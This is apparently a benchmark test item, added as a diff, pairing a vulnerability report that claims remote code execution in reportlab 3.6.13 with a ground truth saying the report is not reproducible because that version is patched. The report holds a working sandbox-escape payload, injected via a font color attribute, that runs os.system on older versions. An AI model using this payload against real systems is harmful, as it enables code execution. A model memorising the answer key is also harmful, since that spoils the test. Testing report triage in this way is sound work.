@@ -1,0 +1,18 @@
+{
+  "report": {
+    "report_id": "reportlab-vshift",
+    "package": "reportlab",
+    "affected_version": "3.6.13",
+    "title": "RCE in reportlab 3.6.13",
+    "body": "URGENT: reportlab 3.6.13 is vulnerable to remote code execution. Please assign a CVE.\n\nRl_safe_eval sandbox escape: a crafted color attribute is eval'd as python during pdf render.\n\nAffected: 3.6.13.\n\nProof of concept:\n\n```python\nimport os, tempfile\nfrom reportlab.platypus import SimpleDocTemplate, Paragraph\nfrom reportlab.lib.styles import getSampleStyleSheet\nsentinel = os.path.join(tempfile.gettempdir(), \"slopgate_reportlab\")\ntry: os.remove(sentinel)\nexcept OSError: pass\npayload = (\"<para><font color=\\\"[[[getattr(pow, Word('__globals__'))['os']\"\n           \".system('touch %s') for Word in [orgTypeFun('Word',(str,),\"\n           \"{'mutated':1,'startswith':lambda self,x:1==0,\"\n           \"'__eq__':lambda self,x:self.mutate() and self.mutated<0 and str(self)==x,\"\n           \"'mutate':lambda self:{setattr(self,'mutated',self.mutated-1)},\"\n           \"'__hash__':lambda self:hash(str(self))})]] \"\n           \"for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'\\\">\"\n           \"x</font></para>\") % sentinel\ndoc = SimpleDocTemplate(os.path.join(tempfile.gettempdir(), \"slopgate_out.pdf\"))\ntry: doc.build([Paragraph(payload, getSampleStyleSheet()[\"Normal\"])])\nexcept Exception as e: print(\"raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(sentinel) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "bounty_hunter"
+  },
+  "ground_truth": {
+    "expected_verdict": "not_reproducible",
+    "package": "reportlab",
+    "fixed_version": "3.6.13",
+    "cve": "CVE-2023-33733",
+    "source": "GHSA/NVD",
+    "note": "real PoC but claims patched version"
+  }
+}
